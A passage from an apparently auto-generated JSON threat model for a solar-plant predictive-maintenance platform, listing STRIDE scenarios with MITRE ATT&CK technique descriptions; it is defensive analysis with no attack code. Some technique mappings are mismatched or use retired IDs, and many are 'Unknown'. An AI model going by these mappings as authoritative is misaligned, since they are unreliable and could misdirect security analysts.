                "id": "attack-pattern--39a130e1-6ab7-434a-8bd2-418e7d9d6427",
                "technique_id": "T1058"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker gains access to the Dashboard and manipulates predictive models\u2019 outputs.",
            "Assumptions": [
                {
                    "Assumption": "Attackers can guess or steal credentials for Dashboard access.",
                    "Role": "Attacker",
                    "Condition": "Weak authentication mechanisms."
                },
                {
                    "Assumption": "The system does not verify the integrity of AI/ML model outputs.",
                    "Role": "System",
                    "Condition": "Lack of integrity verification mechanisms."
                },
                {
                    "Assumption": "There is no real-time anomaly detection for Dashboard interactions.",
                    "Role": "System",
                    "Condition": "Absence of behavior analytics."
                }
            ],
            "Potential Impact": "Wrong maintenance actions triggered or delayed causing potential equipment damage and loss of efficiency.",
            "MITRE ATT&CK Keywords": [
                "Dashboard Access",
                "Model Manipulation",
                "Elevated Privileges"
            ],
            "mitre_technique": {
                "name": "Process Injection",
                "description": "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \n\nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \n\nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. ",
                "id": "attack-pattern--43e7dc91-05b2-474c-b9ac-2ed4fe101f4d",
                "technique_id": "T1055"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An employee denies making specific changes to the configuration of predictive models.",
            "Assumptions": [
                {
                    "Assumption": "Changes to the system configuration are not logged.",
                    "Role": "System",
                    "Condition": "No audit trail exists for config changes."
                },
                {
                    "Assumption": "Config management lacks proper version control.",
                    "Role": "System",
                    "Condition": "Inability to track config history."
                },
                {
                    "Assumption": "Lack of non-repudiation mechanisms.",
                    "Role": "System",
                    "Condition": "Changes are not cryptographically signed."
                }
            ],
            "Potential Impact": "System maintenance issues due to undetected unauthorized changes.",
            "MITRE ATT&CK Keywords": [
                "Configuration Changes",
                "Audit Trail",
                "Non-repudiation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker masks their activities within the TOREADOR Platform by manipulating logs.",
            "Assumptions": [
                {
                    "Assumption": "Logs are stored in a writable format without integrity protection.",
                    "Role": "System",
                    "Condition": "Logs can be modified or deleted post-event."
                },
                {
                    "Assumption": "Administrative access to logs is not restricted.",
                    "Role": "System",
                    "Condition": "Inappropriate access controls on log files."
                },
                {
                    "Assumption": "The system does not immediately offload logs to a secure location.",
                    "Role": "System",
                    "Condition": "Logs are retained locally for prolonged periods."
                }
            ],
            "Potential Impact": "Compromised system integrity and difficulty in forensic analysis.",
            "MITRE ATT&CK Keywords": [
                "Log Manipulation",
                "Log Deletion",
                "Cover Tracks"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An operator denies having received a critical alert regarding system maintenance needs.",
            "Assumptions": [
                {
                    "Assumption": "Alerts are not logged.",
                    "Role": "System",
                    "Condition": "Failure to record alert events."
                },
                {
                    "Assumption": "There is no alert acknowledgment mechanism.",
                    "Role": "System",
                    "Condition": "Lack of confirmation-based alert system."
                },
                {
                    "Assumption": "Notification delivery is unreliable.",
                    "Role": "System",
                    "Condition": "Alerts not consistently received via intended channels."
                }
            ],
            "Potential Impact": "Unaddressed maintenance issues escalating to major system failures.",
            "MITRE ATT&CK Keywords": [
                "Alert Logging",
                "System Notifications",
                "Acknowledgments"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive data intercepted during transmission between the Data Logger and Receiver.",
            "Assumptions": [
                {
                    "Assumption": "Data in transit is not encrypted.",
                    "Role": "System",
                    "Condition": "Sensitive data is transmitted in plaintext."
                },
                {
                    "Assumption": "Attackers have network access.",
                    "Role": "Attacker",
                    "Condition": "Network segments are accessible to unauthorized users."
                },
                {
                    "Assumption": "No network-level encryption or secure tunneling is used.",
                    "Role": "System",
                    "Condition": "Missing protocols like SSL/TLS for data transmission."
                }
            ],
            "Potential Impact": "Exposure of sensitive operational data and potential misuse.",
            "MITRE ATT&CK Keywords": [
                "Eavesdropping",
                "Data Interception",
                "Confidential Data"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Unauthorized access to the metadata stored in the TOREADOR Platform reveals sensitive information.",
            "Assumptions": [
                {
                    "Assumption": "Access to metadata is not restricted.",
                    "Role": "System",
                    "Condition": "Lack of proper access controls."
                },
                {
                    "Assumption": "Metadata is not encrypted at rest.",
                    "Role": "System",
                    "Condition": "Data is stored in plaintext on disk."
                },
                {
                    "Assumption": "No monitoring or logging of access to metadata.",
                    "Role": "System",
                    "Condition": "Inability to detect unauthorized access."
                }
            ],
            "Potential Impact": "Leakage of sensitive contextual information about solar plants.",
            "MITRE ATT&CK Keywords": [
                "Metadata Access",
                "Data Leakage",
                "Unauthorized Access"
            ],
            "mitre_technique": {
                "name": "Exploitation of Remote Services",
                "description": "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services.(Citation: NVD CVE-2014-7169)\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.",
                "id": "attack-pattern--9db0cf3a-a3c9-4012-8268-123b9db6fd82",
                "technique_id": "T1210"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Compromised Anonymity (Anon) Agent leaks anonymized data back to original sources.",
            "Assumptions": [
                {
                    "Assumption": "Weak anonymization techniques in place.",
                    "Role": "System",
                    "Condition": "Performing insufficient or reversible anonymization."
                },
                {
                    "Assumption": "Anon Agent is susceptible to compromise.",
                    "Role": "System",
                    "Condition": "Lack of robust hardening methods."
                },
                {
                    "Assumption": "No monitoring for data leaks from the Anon Agent.",
                    "Role": "System",
                    "Condition": "Lack of telemetry on anonymization process."
                }
            ],
            "Potential Impact": "Re-identification of individuals or systems from anonymized data.",
            "MITRE ATT&CK Keywords": [
                "Anonymization",
                "Data Leak",
                "Insufficient Obfuscation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A Distributed Denial of Service (DDoS) attack targets the Receiver to disrupt data flow.",
            "Assumptions": [
                {
                    "Assumption": "The Receiver lacks DDoS mitigation strategies.",
                    "Role": "System",
                    "Condition": "No traffic filtering or rate limiting."
                },
                {
                    "Assumption": "The network is not segmented to limit DDoS impact.",
                    "Role": "System",
                    "Condition": "Flat network topology without isolation mechanisms."
                },
                {
                    "Assumption": "The system does not employ redundancy for critical services.",
                    "Role": "System",
                    "Condition": "Single points of failure exist in data collection."
                }
            ],
            "Potential Impact": "Loss of data transmission results in system inefficiencies and potential hazards due to unmonitored components.",
            "MITRE ATT&CK Keywords": [
                "DDoS",
                "Network Attack",
                "Service Disruption"
            ],
            "mitre_technique": {
                "name": "Network Denial of Service",
                "description": "Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth services rely on. Example resources include specific websites, email services, DNS, and web-based applications. Adversaries have been observed conducting network DoS attacks for political purposes(Citation: FireEye OpPoisonedHandover February 2016) and to support other malicious activities, including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism, and extortion.(Citation: Symantec DDoS October 2014)\n\nA Network DoS will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on. For example, an adversary may send 10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the internet. This traffic can be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform Network DoS attacks several aspects apply to multiple methods, including IP address spoofing, and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nFor DoS attacks targeting the hosting system directly, see [Endpoint Denial of Service](https://attack.mitre.org/techniques/T1499).",
                "id": "attack-pattern--d74c4a7e-ffbf-432f-9365-7ebf1f787cab",
                "technique_id": "T1498"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "The AI/ML models hosted on the TOREADOR Platform are overwhelmed with input data, causing failures.",
            "Assumptions": [
                {
                    "Assumption": "No input validation or throttling for the AI/ML models.",
                    "Role": "System",
                    "Condition": "System accepts all inputs without constraints."
                },
                {
                    "Assumption": "Single infrastructure hosts critical AI/ML models.",
                    "Role": "System",
                    "Condition": "No load balancing or distributed deployment."
                },
                {
                    "Assumption": "Insufficient monitoring of system performance.",
                    "Role": "System",
                    "Condition": "Lack of telemetry and real-time performance alerts."
                }
            ],
            "Potential Impact": "Interruption of AI/ML operations and degraded predictive maintenance capabilities.",
            "MITRE ATT&CK Keywords": [
                "Input Flooding",
                "Model Overloading",
                "Service Degradation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An insider triggers a controlled failure in the Data Logger to halt data collection.",
            "Assumptions": [
                {
                    "Assumption": "Operational controls are not adequately segregated.",
                    "Role": "System",
                    "Condition": "Insiders have access to critical operation controls."
                },
                {
                    "Assumption": "There is no watchdog mechanism to identify and recover from anomalies.",
                    "Role": "System",
                    "Condition": "System lacks self-recovery features."
                },
                {
                    "Assumption": "Maintenance notifications are not sent out proactively.",
                    "Role": "System",
                    "Condition": "Inadequate monitoring and alert systems."
                }
            ],
            "Potential Impact": "Significant data loss and disruption in predictive maintenance and power optimization.",
            "MITRE ATT&CK Keywords": [
                "Insider Threat",
                "Service Interruption",
                "Data Logger"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a software vulnerability in the TOREADOR Platform to gain admin access.",
            "Assumptions": [
                {
                    "Assumption": "Unpatched software vulnerabilities exist.",
                    "Role": "System",
                    "Condition": "Software is not regularly updated or patched."
                },
                {
                    "Assumption": "The platform lacks detailed permission management.",
                    "Role": "System",
                    "Condition": "Access control policies are not strictly enforced."
                },
                {
                    "Assumption": "No thorough vulnerability scanning or penetration testing is performed.",
                    "Role": "System",
                    "Condition": "System lacks regular security assessments."
                }
            ],
            "Potential Impact": "Full control over sensitive data and system configuration by unauthorized individuals.",
            "MITRE ATT&CK Keywords": [
                "Privilege Escalation",
                "Vulnerability Exploit",
                "Admin Access"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Malicious user gains root access to the Data Logger through a privilege escalation exploit.",
            "Assumptions": [
                {
                    "Assumption": "The Data Logger software has privilege escalation vulnerabilities.",
                    "Role": "System",
                    "Condition": "Software is outdated or misconfigured."
                },
                {
                    "Assumption": "There are no integrity checks to prevent unauthorized access.",
                    "Role": "System",
                    "Condition": "Lack of security compounding elements like SELinux."
                },
                {
                    "Assumption": "Unauthorized software installation is not restricted.",
                    "Role": "System",
                    "Condition": "System policy allows installation of arbitrary software."
                }
            ],
            "Potential Impact": "Complete compromise of data integrity and potential manipulation of sensor readings.",
            "MITRE ATT&CK Keywords": [
                "Root Access",
                "Data Logger Exploit",
                "System Compromise"
            ],
            "mitre_technique": {
                "name": "Kernel Modules and Extensions",
                "description": "Loadable Kernel Modules (or LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. (Citation: Linux Kernel Programming)\u00a0When used maliciously, Loadable Kernel Modules (LKMs) can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0). (Citation: Linux Kernel Module Programming Guide)\u00a0Adversaries can use loadable kernel modules to covertly persist on a system and evade defenses. Examples have been found in the wild and there are some open source projects. (Citation: Volatility Phalanx2) (Citation: CrowdStrike Linux Rootkit) (Citation: GitHub Reptile) (Citation: GitHub Diamorphine)\n\nCommon features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users. (Citation: iDefense Rootkit Overview)\n\nKernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Several examples have been found where this can be used. (Citation: RSAC 2015 San Francisco Patrick Wardle) (Citation: Synack Secure Kernel Extension Broken) Examples have been found in the wild. (Citation: Securelist Ventir)",
                "id": "attack-pattern--6be14413-578e-46c1-8304-310762b3ecd5",
                "technique_id": "T1215"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An internal user abuses administrative privileges to modify AI/ML model configurations on the TOREADOR Platform.",
            "Assumptions": [
                {
                    "Assumption": "Administrative access is not properly logged or monitored.",
                    "Role": "System",
                    "Condition": "Lack of audit logs for admin actions."
                },
                {
                    "Assumption": "Access control policies are weakly enforced or misconfigured.",
                    "Role": "System",
                    "Condition": "Admins have excessive privileges without oversight."
                },
                {
                    "Assumption": "There is no multifactor authentication for administrative actions.",
                    "Role": "System",
                    "Condition": "Admins authenticate with only username and password."
                }
            ],
            "Potential Impact": "Potential sabotage or data exfiltration resulting in compromised predictive capabilities.",
            "MITRE ATT&CK Keywords": [
                "Administrative Abuse",
                "Model Modification",
                "Internal Threat"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        }
    ]
},
{
    "case_number": "9",
    "batch_number": "6",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses a compromised or spoofed sensor to send falsified data to the Data Logger.",
            "Assumptions": [
                {
                    "Assumption": "Sensors do not have robust authentication.",
                    "Role": "Attacker",
                    "Condition": "Attacker has access to the sensor network or devices."
                },
                {
                    "Assumption": "Data Logger does not validate data sources strongly.",
                    "Role": "System",
                    "Condition": "Data Logger accepts inputs without thorough validation."
                },
                {
                    "Assumption": "Physical access to sensor locations is not well-guarded.",
                    "Role": "Site Security",
                    "Condition": "Sensors are deployed in easily accessible public or semi-public areas."
                }
            ],
            "Potential Impact": "Compromised data integrity, leading to incorrect AI/ML model predictions affecting maintenance and power flow.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network",
                "device",
                "data injection"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "The attacker gains unauthorized access to the Dashboard using stolen credentials.",
            "Assumptions": [
                {
                    "Assumption": "Weak password policies in place.",
                    "Role": "User",
                    "Condition": "Employees use weak or reused passwords."
                },
                {
                    "Assumption": "Lack of multi-factor authentication (MFA).",
                    "Role": "System",
                    "Condition": "No multi-layered authentication process implemented."
                },
                {
                    "Assumption": "Phishing campaigns are effective.",
                    "Role": "Attacker",
                    "Condition": "Attackers successfully phish employees."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of operational data and manipulation of maintenance schedules.",
            "MITRE ATT&CK Keywords": [
                "credential access",
                "account compromise",
                "spoofing",
                "dashboard"
            ],
            "mitre_technique": {
                "name": "Exploitation for Credential Access",
                "description": "Adversaries may exploit software vulnerabilities in an attempt to collect credentials. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0\n\nCredentialing and authentication mechanisms may be targeted for exploitation by adversaries as a means to gain access to useful credentials or circumvent the process to gain authenticated access to systems. One example of this is `MS14-068`, which targets Kerberos and can be used to forge Kerberos tickets using domain user permissions.(Citation: Technet MS14-068)(Citation: ADSecurity Detecting Forged Tickets) Another example of this is replay attacks, in which the adversary intercepts data packets sent between parties and then later replays these packets. If services don't properly validate authentication requests, these replayed packets may allow an adversary to impersonate one of the parties and gain unauthorized access or privileges.(Citation: Bugcrowd Replay Attack)(Citation: Comparitech Replay Attack)(Citation: Microsoft Midnight Blizzard Replay Attack)\n\nSuch exploitation has been demonstrated in cloud environments as well. For example, adversaries have exploited vulnerabilities in public cloud infrastructure that allowed for unintended authentication token creation and renewal.(Citation: Storm-0558 techniques for unauthorized email access)\n\nExploitation for credential access may also result in Privilege Escalation depending on the process targeted or credentials obtained.",
                "id": "attack-pattern--9c306d8d-cde7-4b4c-b6e8-d0bb16caca36",
                "technique_id": "T1212"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker manipulates the Anonymity (Anon) Agent to re-identify anonymized data.",
            "Assumptions": [
                {
                    "Assumption": "Weak implementation of anonymity protocols.",
                    "Role": "System",
                    "Condition": "Anonymity protocols are not robust against re-identification techniques."
                },
                {
                    "Assumption": "Access to metadata and anonymized data.",
                    "Role": "Insider",
                    "Condition": "Insider or attacker gains access to both datasets."
                },
                {
                    "Assumption": "Insufficient monitoring of Anon Agent actions.",
                    "Role": "System",
                    "Condition": "Lack of thorough auditing and monitoring of data transformation processes."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive data potentially leading to privacy breaches.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "data manipulation",
                "anonymity",
                "re-identification"
            ],
            "mitre_technique": {
                "name": "Transmitted Data Manipulation",
                "description": "Adversaries may alter data en route to storage or other systems in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating transmitted data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nManipulation may be possible over a network connection or between system processes where there is an opportunity deploy a tool that will intercept and change information. The type of modification and the impact it will have depends on the target transmission mechanism as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--cc1e737c-236c-4e3b-83ba-32039a626ef8",
                "technique_id": "T1493"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies the data in transit between the Data Logger and the Receiver.",
            "Assumptions": [
                {
                    "Assumption": "Lack of encrypted communication channels.",
                    "Role": "System",
                    "Condition": "Data is transmitted without robust encryption."
                },
                {
                    "Assumption": "Vulnerable network infrastructure.",
                    "Role": "Infrastructure",
                    "Condition": "Network is exposed to potential interception and injection attacks."
                },
                {
                    "Assumption": "Insufficient validation of data integrity on the Receiver end.",
                    "Role": "System",
                    "Condition": "Receiver accepts data without integrity checks."
                }
            ],
            "Potential Impact": "Corrupted data leading to inaccurate model predictions and compromised maintenance scheduling.",
            "MITRE ATT&CK Keywords": [
                "data manipulation",
                "network",
                "tampering",
                "MITM (Man-in-the-Middle)"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Malware infects the Data Logger, altering the collected sensor data before forwarding it.",
            "Assumptions": [
                {
                    "Assumption": "Data Logger lacks advanced malware detection.",
                    "Role": "System",
                    "Condition": "No comprehensive malware protection is in place on the device."
                },
                {
                    "Assumption": "Attackers have access to the network or physical access to Data Loggers.",
                    "Role": "Attacker",
                    "Condition": "Attacker infiltrates network or physically accesses devices."
                },
                {
                    "Assumption": "Insufficient security updates and patch management.",
                    "Role": "Maintenance",
                    "Condition": "Data Logger software is not regularly updated."
                }
            ],
            "Potential Impact": "Manipulated data compromises the integrity of predictive models and leads to erroneous operational decisions.",
            "MITRE ATT&CK Keywords": [
                "malware",
                "tampering",
                "data corruption",
                "device"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker with insider access modifies AI/ML model parameters within the TOREADOR platform.",
            "Assumptions": [
                {
                    "Assumption": "Privileges are not adequately managed.",
                    "Role": "System",
                    "Condition": "Insider has excessive privileges and can alter AI/ML models."
                },
                {
                    "Assumption": "Lack of change management and auditing.",
                    "Role": "System",
                    "Condition": "Changes to models are not logged or monitored."
                },
                {
                    "Assumption": "Weak access controls to the TOREADOR platform.",
                    "Role": "System",
                    "Condition": "Access controls are not stringent enough to prevent unauthorized modifications."
                }
            ],
            "Potential Impact": "Corrupted model performance leading to incorrect predictive analytics and operational disruptions.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "insider threat",
                "model manipulation",
                "cloud"
            ],
            "mitre_technique": {
                "name": "Modify Cloud Compute Infrastructure",
                "description": "An adversary may attempt to modify a cloud account's compute service infrastructure to evade defenses. A modification to the compute service infrastructure can include the creation, deletion, or modification of one or more components such as compute instances, virtual machines, and snapshots.\n\nPermissions gained from the modification of infrastructure components may bypass restrictions that prevent access to existing infrastructure. Modifying infrastructure components may also allow an adversary to evade detection and remove evidence of their presence.(Citation: Mandiant M-Trends 2020)",
                "id": "attack-pattern--144e007b-e638-431d-a894-45d90c54ab90",
